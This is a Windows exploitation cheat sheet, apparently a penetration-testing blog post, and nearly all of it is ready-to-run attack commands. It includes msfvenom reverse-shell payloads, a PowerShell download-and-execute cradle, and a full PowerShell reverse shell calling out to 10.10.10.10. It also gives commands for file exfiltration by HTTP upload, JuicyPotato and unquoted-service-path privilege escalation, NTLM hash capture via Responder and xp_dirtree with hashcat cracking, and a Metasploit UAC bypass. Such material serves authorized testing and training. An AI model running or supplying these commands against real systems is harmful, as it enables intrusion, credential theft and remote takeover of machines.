---
title: 4. Exploitation - Windows
categories:
  - Pentesting
  - Windows
tags:
  - Pentesting
  - Windows
  - Exploitation
toc: true
---

---
Step 4 in a penetration test: Exploitation.
Exploit the vulnerabilities found to gain access to the target machine.

---
<!-- more -->

<br>

## Payloads

### Metasploit
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f py -a x86 --platform windows -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode 
```
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.10.10_443.exe
`

<br>

## Exploit Scripts

### PowerShell
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')
```

### Script Execution
```batch
c:\path\to\payload.exe
```

<br>

## Servers

### SMB Server
```bash
smbserver.py $share /path/ -smb2support -username user -password pass -port 1445 -configfile smbserver.conf
```
```batch
\\10.10.10.10\share\whoami.exe
net use Z: \\10.10.10.10\share /user:'username' 'password'
```

### HTTP Server
```bash
python -m http.server 8080
```
```batch
powershell -Command "Invoke-WebRequest -Uri http://10.10.10.10:8080/payload.exe -OutFile C:\path\to\payload.exe"
```

<br>

## File Transfer


```batch Download files
powershell -Command "Invoke-WebRequest -Uri http://10.10.10.10/file.exe -OutFile C:\path\to\file.exe"
```
```batch Upload files
powershell -Command "Invoke-WebRequest -Uri http://10.10.10.10/upload -Method Post -InFile C:\path\to\file.exe"
```

<br>

## Exploitation Tools

### Windows Reverse Shell (PowerShell)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
  $data = (New-Object -TypeName PSObject -Property @{Data = $buffer[0..($i-1)]}).Data;
  $response = Invoke-Expression -Command ([Text.Encoding]::ASCII.GetString($data));
  $response = [Text.Encoding]::ASCII.GetBytes($response + 'Prompt>');
  $stream.Write($response, 0, $response.Length);
}
```

<br>

## Privilege Escalation

### Check Privileges
```batch
whoami /priv      REM Check SeImpersoantePrivilege - Juicy Potato
```

<br>

### `JuicyPotato.exe` privesc from service acc to System
Use a CLSID from the list provided by JP [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
```batch
jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
```

<br>

### Unquoted Service Path
```powershell Check for unquoted service paths
wmic service get name,pathname, startname | findstr /i "c:\program files"
```
```batch Exploit unquoted service path
sc config "ServiceName" binPath= "C:\path\to\payload.exe"
```

<br>

### Capture NTLMv2 hashes via Responder
Request a file in an SMB share from a database usnig `xp_dirtree`
```bash Start responder
responder -I tun0
```
```bash Request a file from a non-existing SMB share
mssqlclient.py $user:'$pass'@$IP -windows-auth

SQL> xp_dirtree '\\10.10.10.10\nonexistent';
```

Crack the hash - view format [here](https://hashcat.net/wiki/doku.php?id=example_hashes)
```bash NetNTLMv2
# admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030

hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force
```
```bash Kerberos 5, etype 23, AS-REP
#  $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac 

hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt -o hash.cracked --force
```

<br>

### Metasploit - bypass UAC
```bash
msfconsole -x 'use exploit/windows/local/bypass_uac; set session 1; run'
```

<br>

---
---